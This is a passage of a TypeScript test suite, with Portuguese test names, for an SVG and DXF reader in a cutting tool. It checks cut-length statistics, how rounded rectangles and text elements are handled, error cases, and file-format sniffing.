		);
		expect(s.parts[0].bbox.h).toBeCloseTo(40, 6);
		expect(s.meta.stats.cutLengthMm).toBeCloseTo(
			60 + 40 + Math.hypot(60, 40),
			6,
		);
	});

	it('rect com cantos arredondados usa bulge (arco de verdade)', () => {
		const s = readSvg(
			'<svg xmlns="http://www.w3.org/2000/svg" width="40mm" height="20mm" viewBox="0 0 40 20"><rect x="0" y="0" width="40" height="20" rx="5" ry="5"/></svg>',
		);
		const seg = s.parts[0].paths[0].seg as Extract<Seg, { k: 'poly' }>;
		expect(seg.bulges).toBeDefined();
		expect(s.meta.stats.cutLengthMm).toBeCloseTo(80 + TAU * 5, 6);
	});

	it('texto de SVG é contado e descartado (não corta)', () => {
		const s = readSvg(
			'<svg xmlns="http://www.w3.org/2000/svg" width="50mm" height="50mm" viewBox="0 0 50 50"><text x="1" y="1">oi</text><rect width="50" height="50"/></svg>',
		);
		expect(readDiagnostics(s)?.textos).toBe(1);
		expect(s.meta.warnings.join(' ')).toContain('texto');
		expect(s.meta.stats.cutLengthMm).toBeCloseTo(200, 6);
	});

	it('SVG sem geometria recusa com 400', () => {
		expect(() =>
			readSvg(
				'<svg xmlns="http://www.w3.org/2000/svg"><text>nada</text></svg>',
			),
		).toThrow(ToolEngineError);
		expect(() => readSvg('nao e svg')).toThrow(ToolEngineError);
	});
});

// ---------------------------------------------------------------------------
// sniffFormat — mimetype é ignorado de propósito
// ---------------------------------------------------------------------------

describe('sniffFormat', () => {
	it('reconhece DXF pelo par 0/SECTION', () => {
		expect(sniffFormat(RECT_HOLE)).toBe('dxf');
		expect(sniffFormat('\r\n  0\r\nSECTION\r\n  2\r\nHEADER\r\n')).toBe('dxf');
	});

	it('reconhece DXF sujo pelo $ACADVER', () => {
		expect(sniffFormat('lixo no topo\n9\n$ACADVER\n1\nAC1015\n')).toBe('dxf');
	});

	it('reconhece SVG e recusa o resto', () => {
		expect(sniffFormat(SVG_MM)).toBe('svg');
		expect(sniffFormat(SVG_MALICIOSO)).toBe('svg');
		expect(sniffFormat('%PDF-1.7\n')).toBeNull();
		expect(sniffFormat(new Uint8Array([0x89, 0x50, 0x4e, 0x47]))).toBeNull();
	});

	it('aceita Buffer/Uint8Array (upload cru)', () => {
		expect(sniffFormat(new TextEncoder().encode(SVG_MM))).toBe('svg');
		expect(sniffFormat(new TextEncoder().encode(RECT_HOLE))).toBe('dxf');
	});
});
